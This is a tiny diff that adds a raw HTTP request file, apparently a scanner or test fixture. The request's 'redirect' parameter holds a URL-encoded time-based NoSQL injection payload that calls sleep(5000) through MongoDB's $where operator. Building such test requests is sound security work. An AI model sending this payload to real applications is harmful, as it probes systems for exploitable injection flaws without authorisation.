@@ -1,0 +1,4 @@
+GET /a?redirect=%7B%22%24where%22%3A%22sleep%285000%29%2B%7C%7C%2Btrue%22%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
